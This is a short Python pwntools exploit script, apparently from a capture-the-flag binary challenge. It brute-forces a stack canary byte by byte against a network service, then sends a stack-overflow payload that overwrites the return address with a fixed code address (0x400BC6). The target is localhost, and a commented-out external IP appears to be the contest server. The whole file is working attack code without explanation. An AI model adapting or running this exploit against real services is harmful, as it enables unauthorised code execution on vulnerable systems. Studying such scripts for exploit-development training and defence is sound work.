from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
LOCAL = False
'''
if LOCAL:
    p = process('filename')
else:
    p = remote('127.0.0.1',5555)
'''
def crack_canary():
    canary = "\x00"
    while True:
        if len(canary) == 8:
            break
        for item in range(0xff):
            canary_tmp = canary + chr(item)
            try:
                #r = remote('218.2.197.234', 2090)
                r = remote('127.0.0.1',5555)
                r.recvuntil("Welcome!\n")
                payload = "A"*(0x70-8)
                payload += canary_tmp
                r.send(payload)
                data = r.recv(100,timeout=1)
                if "Message received!" in data:
                    canary += chr(item)
                    log.info("get:{0}".format(hex(item)))
                    break
                r.close()
            except:
                continue
    #raw_input("now,stop")
    log.info("[*] canary:{0}".format(hex(u64(canary))))
    return canary
def main():
    #canary_local = 0x977e4ba376461900
    canary = 0x9f6b51e88c534100
    payload = "a" *(0x70-0x8) + p64(canary) + "aaaaaaaa"+p64(0x0000000000400BC6)
    r = remote('127.0.0.1', 5555)
    r.recvuntil("Welcome!\n")
    r.send(payload)
    print r.recvline(1024,timeout=0.5)
    r.close()
if __name__ == '__main__':
    main()
